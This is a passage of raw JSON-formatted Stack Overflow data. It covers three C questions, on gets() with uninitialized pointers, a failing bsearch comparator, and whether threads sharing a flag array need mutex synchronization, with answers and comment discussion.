"https://i.stack.imgur.com/Ci3eh.png?s=128&g=1", "display_name": "Simon B", "link": "https://stackoverflow.com/users/2344524/simon-b"}, "edited": false, "score": 2, "creation_date": 1437552116, "post_id": 31557618, "comment_id": 51071697, "body": "In addition to the call to gets() being wrong, the pointers s and r have been created, but are not actually pointing at any memory.  Attempting to use scanf or printf on them is undefined behaviour, and will probably crash."}], "answers": [{"tags": [], "owner": {"reputation": 13, "user_id": 5142317, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/lwgjB.jpg?s=128&g=1", "display_name": "Amit Phartiyal", "link": "https://stackoverflow.com/users/5142317/amit-phartiyal"}, "is_accepted": false, "score": -1, "last_activity_date": 1437560906, "last_edit_date": 1437560906, "creation_date": 1437557366, "answer_id": 31559181, "question_id": 31557618, "link": "https://stackoverflow.com/questions/31557618/how-to-use-character-pointer-for-string/31559181#31559181", "title": "how to use character pointer for string?", "body": "<pre><code>#include&lt;stdio.h&gt;\nint main()\n{\n   char *s,*r;\n   printf(\"enter\\n\");\n   gets(s);\n   scanf(\"%s\",r);\n   printf(\"%s\\n\",s);\n   printf(\"%s\\n\",r); \n   return 0;\n}\n</code></pre>\n\n<p>Reason:\nYou can't initialize the character pointer s in gets(),function gets() takes a input string from the user,thus s doesn't got initialized in your code.</p>\n"}], "migrated_from": {"other_site": {"aliases": ["http://programmer.stackexchange.com", "http://programmers.stackexchange.com"], "markdown_extensions": ["Prettify"], "launch_date": 1292524346, "open_beta_date": 1283972400, "closed_beta_date": 1283367600, "site_state": "normal", "high_resolution_icon_url": "https://cdn.sstatic.net/Sites/softwareengineering/Img/apple-touch-icon@2.png", "twitter_account": "StackSoftEng", "favicon_url": "https://cdn.sstatic.net/Sites/softwareengineering/Img/favicon.ico", "icon_url": "https://cdn.sstatic.net/Sites/softwareengineering/Img/apple-touch-icon.png", "audience": "professionals, academics, and students working within the systems development life cycle", "site_url": "https://softwareengineering.stackexchange.com", "api_site_parameter": "softwareengineering", "logo_url": "https://cdn.sstatic.net/Sites/softwareengineering/Img/logo.png", "name": "Software Engineering", "site_type": "main_site"}, "on_date": 1437553130, "question_id": 290432}, "owner": {"user_type": "does_not_exist", "display_name": "Pavithra Chandrasekaran"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 59, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1437560906, "creation_date": 1437548910, "last_edit_date": 1437559067, "question_id": 31557618, "link": "https://stackoverflow.com/questions/31557618/how-to-use-character-pointer-for-string", "title": "how to use character pointer for string?", "body": "<p>please help me with this</p>\n\n<p>i tried getting a string through char * and gets()\nit doesnt give any compile time error but it throws run time error segmentation fault.\nbut if i give</p>\n\n<p>char *s=\"sample\";</p>\n\n<p>its working fine</p>\n\n<p>anyone could explain me</p>\n\n<pre><code>int main()\n{\n    char *s,*r;\n    printf(\"enter\\n\");\n    gets(\"pavithra\");\n    scanf(\"%s\",r);\n    printf(\"%s\",s);\n    printf(\"%s\",r);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "bsearch"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1437549103, "post_id": 31556068, "comment_id": 51069383, "body": "remove <code>fflush(stdin);</code>, it&#39;s undefined behaviour."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 5142175, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/93UAX.jpg?s=128&g=1", "display_name": "SJ0407", "link": "https://stackoverflow.com/users/5142175/sj0407"}, "edited": false, "score": 0, "creation_date": 1437552311, "post_id": 31556535, "comment_id": 51071216, "body": "Your explanation on bsearch compar parameter is very clear and useful.   Now, I totally understood its usage.   Your suggestion worked, many thanks Art.   But why don&#39;t cast void * pointers in C, especially from malloc, but also the return value from bsearch?"}, {"owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "reply_to_user": {"reputation": 11, "user_id": 5142175, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/93UAX.jpg?s=128&g=1", "display_name": "SJ0407", "link": "https://stackoverflow.com/users/5142175/sj0407"}, "edited": false, "score": 0, "creation_date": 1437554566, "post_id": 31556535, "comment_id": 51072531, "body": "Because there&#39;s no reason to cast void pointers to other pointers. And it can hide errors in your code if you forgot the includes for correct function declarations."}], "tags": [], "owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "is_accepted": false, "score": 1, "last_activity_date": 1437550061, "creation_date": 1437550061, "answer_id": 31556535, "question_id": 31556068, "link": "https://stackoverflow.com/questions/31556068/bsearch-failed-to-find-string-member-in-an-array-of-structure/31556535#31556535", "title": "bsearch failed to find string member in an array of structure", "body": "<p>Read the documentation for <code>bsearch</code> more carefully.</p>\n\n<blockquote>\n  <p>The compar routine is expected to have two arguments which point to the key object and to an array member, in that order.</p>\n</blockquote>\n\n<p>This means that the first argument to your compare function will always be exactly what you gave as a first argument to <code>bsearch</code>. So either call it as: <code>bsearch(target, studs, ...)</code> or better yet, rewrite your compare function to:</p>\n\n<pre><code>int\ncomp_name(const void *av, const void *bv) {\n    const char *a = av;\n    const struct student *b = bv;\n    printf(\"comp_name: a-&gt;name=%s, b-&gt;name=%s\\n\", a, b-&gt;name);\n    return strcmp(b-&gt;name, a);\n}\n</code></pre>\n\n<p>Also, please don't cast <code>void *</code> pointers in C, especially from <code>malloc</code>, but also the return value from <code>bsearch</code> in your code.</p>\n"}], "owner": {"reputation": 11, "user_id": 5142175, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/93UAX.jpg?s=128&g=1", "display_name": "SJ0407", "link": "https://stackoverflow.com/users/5142175/sj0407"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 337, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1441557298, "creation_date": 1437548560, "last_edit_date": 1441557298, "question_id": 31556068, "link": "https://stackoverflow.com/questions/31556068/bsearch-failed-to-find-string-member-in-an-array-of-structure", "title": "bsearch failed to find string member in an array of structure", "body": "<p>Using bsearch in C  failed to find a string 'Eva Lam' in an array of structure.  This array is sorted in descending order of string members.  I checked many times, still don't know where the bug is?  BTW, I am using DEV C++ 5.9.4.   Please help, many thanks.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;     // for bsearch\n#include &lt;string.h&gt;\n#define SIZE 4   \n#define NAME_SIZE 20\n\nstruct student {\n  int id;\n  char name[NAME_SIZE];\n};\n\n// Function prototypes\nint comp_name(const void* a, const void* b);\nvoid print_struct_array(struct student studs[], int size, int serial);\n\nint main(){\n  int i, option=0;\n  struct student *stud, *target;\n\n  // studs array already sort in descending order of name\n  struct student studs[SIZE] = {{14123456, \"Mary Chan\"}\n    , {11001234, \"Eva Lam\"}\n    , {10123456, \"David Wong\"}\n    , {12345678, \"Chris So\"}\n  };\n\n  printf(\"*** Before Searching ***\\n\");\n  print_struct_array(studs, SIZE, 1);\n\n  target = (struct student*) malloc(sizeof(struct student));\n  if (target == NULL) {\n    fprintf(stderr, \"Out of memory!\\n\");\n    return -1;\n  }\n\n  printf(\"Input student name to search: \");\n  scanf(\"%[^\\n]\", target-&gt;name);\n  fflush(stdin);\n  printf(\"name=%s\\n\", target-&gt;name);\n\n\n  stud = (struct student *)bsearch(target-&gt;name, studs, SIZE,  \n    sizeof(struct student), comp_name);\n  if (!stud)\n     printf(\"name %s not found!\\n\", target-&gt;name);\n  else\n     printf(\"[id, name] found is [%d, %s]\\n\", stud-&gt;id, stud-&gt;name);\n\n\n  return 0;\n}\n\nint comp_name(const void* a, const void* b) {\n   printf(\"comp_name: a-&gt;name=%s, b-&gt;name=%s\\n\", \n     (*(struct student *)a).name, (*(struct student *)b).name);\n   return strcmp((*(struct student *)b).name, \n     (*(struct student *)a).name);\n}\n\n\nvoid print_struct_array(struct student studs[], int size, int serial) {\n  int i;\n\n  printf(\"Student array #%d is {\\n\", serial);\n  for (i=0; i&lt;SIZE; i++) {\n    if (i==0) \n      printf(\"  \");\n    else if (i&lt;=SIZE-1)\n      printf(\", \");\n    printf(\"[%d, %s]\\n\", studs[i].id, studs[i].name);\n  }\n  printf(\"}\\n\");\n}\n</code></pre>\n\n<p>But the output of the program when searching 'Eva Lam' is:</p>\n\n<pre><code>*** Before Searching ***\nStudent array #1 is {\n  [14123456, Mary Chan]\n, [11001234, Eva Lam]\n, [10123456, David Wong]\n, [12345678, Chris So]\n}\nInput student name to search: Eva Lam\nname=Eva Lam\ncomp_name: a-&gt;name=Lam, b-&gt;name=Eva Lam\ncomp_name: a-&gt;name=Lam, b-&gt;name=Mary Chan\nname Eva Lam not found!\n\n--------------------------------\nProcess exited after 8.216 seconds with return value 0\n</code></pre>\n"}, {"tags": ["c", "multithreading", "pthreads", "mutex"], "comments": [{"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 3, "creation_date": 1437547554, "post_id": 31555700, "comment_id": 51068562, "body": "You need synchronization. Whether you need a <i>mutex</i> is a different question."}, {"owner": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 0, "creation_date": 1437547752, "post_id": 31555700, "comment_id": 51068654, "body": "Yes, mutex/semaphore, the operation has to be &quot;atomic&quot; because you read from where another thread writes."}, {"owner": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 0, "creation_date": 1437548488, "post_id": 31555700, "comment_id": 51069050, "body": "@mohan branch prediction is a processor pipeline optimization.  If you think <code>status_flag</code> will be optimized out, you can use the <code>volatile</code> keyword."}, {"owner": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "reply_to_user": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 0, "creation_date": 1437549128, "post_id": 31555700, "comment_id": 51069396, "body": "@JeremiahDicharry: See <a href=\"http://stackoverflow.com/questions/2484980/why-is-volatile-not-considered-useful-in-multithreaded-c-or-c-programming\" title=\"why is volatile not considered useful in multithreaded c or c programming\">stackoverflow.com/questions/2484980/&hellip;</a>..."}, {"owner": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 0, "creation_date": 1437601544, "post_id": 31555700, "comment_id": 51103986, "body": "I stand corrected on the <code>volatile</code> part."}, {"owner": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "reply_to_user": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 0, "creation_date": 1437629908, "post_id": 31555700, "comment_id": 51111757, "body": "@JeremiahDicharry Here I am talking about flag which is set in write part of one thread and in reading I am spinning to get true flag. I don&#39;t want do anything with false flag. actually I have implemented this without mutes/semaphore and it&#39;s working for me. Is it fail in future?"}, {"owner": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 2, "creation_date": 1437630533, "post_id": 31555700, "comment_id": 51111970, "body": "@mohan It will fail because the operation needs to be atomic.  Check out the wikipedia page - <a href=\"https://en.wikipedia.org/wiki/Linearizability#Non-atomic\" rel=\"nofollow noreferrer\">Non-atomic</a> for an example of what can happen."}, {"owner": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 0, "creation_date": 1437630786, "post_id": 31555700, "comment_id": 51112066, "body": "@mohan: mutexes and semaphores are atomic and able to do thread control."}, {"owner": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "reply_to_user": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1437631000, "post_id": 31555700, "comment_id": 51112159, "body": "@EOF these are some method I know for synchronization ,Mutual Exclusion (Mutex) Locks , Condition Variables &amp; Semaphores. Is there any other way to do synchronization? In above situation if we don&#39;t use mutex/semaphore then is there any chance to never get updated data to other thread ?"}, {"owner": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 0, "creation_date": 1437631573, "post_id": 31555700, "comment_id": 51112351, "body": "<code>status_flag [i] == true</code> is not guaranteed to be synchronized between all threads without a method of synchronization, because it is not atomic. Another thread could be writing to <code>status_flag[i]</code> at the same time."}, {"owner": {"reputation": 189, "user_id": 5087437, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11ba4f2d1052c6200d24c211b32dbf17?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremiah Dicharry", "link": "https://stackoverflow.com/users/5087437/jeremiah-dicharry"}, "edited": false, "score": 0, "creation_date": 1437631704, "post_id": 31555700, "comment_id": 51112402, "body": "@mohan: I guess if you&#39;re code is working then whatever floats your boat but it&#39;s bad practice to not do some kind of locking."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1437639908, "post_id": 31555700, "comment_id": 51116890, "body": "You want read/write locks. (<a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/pthread_rwlock_init.html\" rel=\"nofollow noreferrer\">pubs.opengroup.org/onlinepubs/9699919799/functions/&hellip;</a>)"}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1437656593, "post_id": 31555700, "comment_id": 51128079, "body": "If you have C11 support, you can use the new <code>_atomic</code> types to synchronize without any kind of lock. However, if you&#39;re waiting for a flag to change, spinning on an atomic variable is wasting CPU time."}], "answers": [{"comments": [{"owner": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 0, "creation_date": 1437548988, "post_id": 31556176, "comment_id": 51069319, "body": "Obviously if threads were <i>always</i> writing to different indices than the one being read, the loop would be an infinite one..."}, {"owner": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "reply_to_user": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 0, "creation_date": 1437551439, "post_id": 31556176, "comment_id": 51070680, "body": "@Oliver Charlesworth I made sure index which being is read definitely get write. if it reading at  index (e.g. 5)  and write happen at same index  (e.g. 5) after it start reading. So thread which reading will able to break loop or not ? or it will still read a stale data."}, {"owner": {"reputation": 131, "user_id": 3620250, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CNyfe.jpg?s=128&g=1", "display_name": "Dipanjan", "link": "https://stackoverflow.com/users/3620250/dipanjan"}, "reply_to_user": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "edited": false, "score": 0, "creation_date": 1437553312, "post_id": 31556176, "comment_id": 51071793, "body": "@Mohan: If you are reading and writing at the same index then you need a lock."}, {"owner": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "edited": false, "score": 0, "creation_date": 1437557660, "post_id": 31556176, "comment_id": 51074678, "body": "@Dipanjan ok Can&#39;t we avoid use of lock in two thread read &amp; write case?"}, {"owner": {"reputation": 131, "user_id": 3620250, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CNyfe.jpg?s=128&g=1", "display_name": "Dipanjan", "link": "https://stackoverflow.com/users/3620250/dipanjan"}, "reply_to_user": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "edited": false, "score": 0, "creation_date": 1437623932, "post_id": 31556176, "comment_id": 51109989, "body": "@Mohan: If you do not use of lock, then you can not guarantee the sequence  of execution. For example, you started two threads , one is writing(ex- incrementing a variable) and the other is reading it, now you wont be sure that the read will occur after write or before, so you will not get consistent or intended data when you are reading it. So you should use lock, if you do not use , you can not be sure of the sequence of execution. Hope this is clear. :)"}, {"owner": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "edited": false, "score": 0, "creation_date": 1437627927, "post_id": 31556176, "comment_id": 51111090, "body": "@Dipanjan I am talking about flag in my question not about value. So in reading part  I am spinning till the point I don&#39;t get true flag .Initially I am setting flag to false. I don&#39;t want to do anything with false flag and in writing part only setting to true. so what you say?"}, {"owner": {"reputation": 131, "user_id": 3620250, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CNyfe.jpg?s=128&g=1", "display_name": "Dipanjan", "link": "https://stackoverflow.com/users/3620250/dipanjan"}, "reply_to_user": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "edited": false, "score": 1, "creation_date": 1437629855, "post_id": 31556176, "comment_id": 51111734, "body": "@Mohan: This could work without a lock, try to give some delay or sleep, so that the control goes to other thread as well. It might happen, that thread which is reading gets the control and it keep running in infinite loop and the write thread does not gets the chance to modify the flag."}], "tags": [], "owner": {"reputation": 131, "user_id": 3620250, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CNyfe.jpg?s=128&g=1", "display_name": "Dipanjan", "link": "https://stackoverflow.com/users/3620250/dipanjan"}, "is_accepted": false, "score": 1, "last_activity_date": 1437548911, "creation_date": 1437548911, "answer_id": 31556176, "question_id": 31555700, "link": "https://stackoverflow.com/questions/31555700/do-i-really-need-mutex-lock-in-this-case/31556176#31556176", "title": "Do I really need mutex lock in this case?", "body": "<p>If all the threads are operating on different index value, then you do not need a lock. Basically it is equivalent to using different variables. \nIn your code , the value of the variable i is not set or modified. So it is reading only a particular index of flag. And for writing you are using different index, in this case no need to use lock.</p>\n"}, {"comments": [{"owner": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "edited": false, "score": 0, "creation_date": 1437636848, "post_id": 31556748, "comment_id": 51115154, "body": "I got it but still having confusion in case of flag . In case if I am reading value without synchronize I will get some garbage or stale data. But what if one thread only writing (true) flag and other thread reading in for loop till it gets true. Is there no surety to get updated data to other thread without  synchronization ?"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "reply_to_user": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "edited": false, "score": 0, "creation_date": 1437640283, "post_id": 31556748, "comment_id": 51117117, "body": "@Mohan: POSIX is clear, isn&#39;t it? If you do not believe it, try it without synchronisation. You will fail, probably not always, but sometimes."}, {"owner": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "reply_to_user": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1437643167, "post_id": 31556748, "comment_id": 51119014, "body": "@alk it&#39;s not about believe.I am just wondering in other reading thread , it&#39;s spinning to get true flag ,still there is chance of failure why? Maybe because of cache or something else that is not allowing to reading thread to get updated value. I just want to know root causes."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "reply_to_user": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "edited": false, "score": 0, "creation_date": 1437643263, "post_id": 31556748, "comment_id": 51119059, "body": "@Mohan: Because reading and/or writing not necessarly are atomic operations. See also this comment: <a href=\"http://stackoverflow.com/questions/31555700/do-i-really-need-mutex-lock-in-this-case/31556748?noredirect=1#comment51111970_31555700\" title=\"do i really need mutex lock in this case\">stackoverflow.com/questions/31555700/&hellip;</a>"}, {"owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "reply_to_user": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "edited": false, "score": 2, "creation_date": 1437643409, "post_id": 31556748, "comment_id": 51119145, "body": "@Mohan There is no guarantee that you will ever see the changed value. On x86 systems you will most often see the value as soon as possible, but there are situations that can be created (intentionally or by accident) where the changed value will never propagate to the other thread/CPU until you use proper memory synchronization instructions. POSIX is deliberately strict because of portability to systems where you&#39;ll never see the modified value unless you synchronize. But even on x86 the synchronization can be very much delayed. The minimum you can do it to use stdatomic.h from C11."}, {"owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "reply_to_user": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "edited": false, "score": 1, "creation_date": 1437643936, "post_id": 31556748, "comment_id": 51119457, "body": "@Mohan Btw. what do you intend to do with the flag? The flag itself is useless because other memory writes done by the flag setting thread may not be visible to the other thread that reads the flag. So a thread calculates something, writes down the result somewhere, sets the flag that the result is done, the main thread reads the flag, sees that it&#39;s set, reads the result and gets uninitialized garbage. This happens all the time. The past 10 years of performance improvements in x86 CPUs have been about how much CPU designers can get away with not synchronizing things."}], "tags": [], "owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "is_accepted": true, "score": 2, "last_activity_date": 1437550693, "creation_date": 1437550693, "answer_id": 31556748, "question_id": 31555700, "link": "https://stackoverflow.com/questions/31555700/do-i-really-need-mutex-lock-in-this-case/31556748#31556748", "title": "Do I really need mutex lock in this case?", "body": "<p><a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html#tag_04_11\" rel=\"nofollow\">POSIX is quite clear on this</a>:</p>\n\n<blockquote>\n  <p>Applications shall ensure that access to any memory location by more than one thread of control (threads or processes) is restricted such that no thread of control can read or modify a memory location while another thread of control may be modifying it.</p>\n</blockquote>\n\n<p>So without locking you're not allowed to read memory that some other thread may be writing. Furthermore, that part of POSIX describes which function will synchronize the memory between the threads. Before both threads have called any of the functions listed in there, you have no guarantee that the changes made by one thread will be visible to the other thread.</p>\n"}], "owner": {"reputation": 1761, "user_id": 2641959, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/4c6d8336fe8a675f9f20f519faec5fc0?s=128&d=identicon&r=PG&f=1", "display_name": "Mohan", "link": "https://stackoverflow.com/users/2641959/mohan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 517, "favorite_count": 1, "accepted_answer_id": 31556748, "answer_count": 2, "score": 1, "last_activity_date": 1437640197, "creation_date": 1437547361, "last_edit_date": 1437640197, "question_id": 31555700, "link": "https://stackoverflow.com/questions/31555700/do-i-really-need-mutex-lock-in-this-case", "title": "Do I really need mutex lock in this case?", "body": "<p>Consider we have three thread, <code>bool status_flag[500]</code> array, and working situations as follow :</p>\n\n<ol>\n<li><p>Two threads only writing in <code>status_flag</code> array at <strong>different index</strong>. while third thread is only reading at any index.</p></li>\n<li><p>All three thread writing at different index. While all three threads reading at any 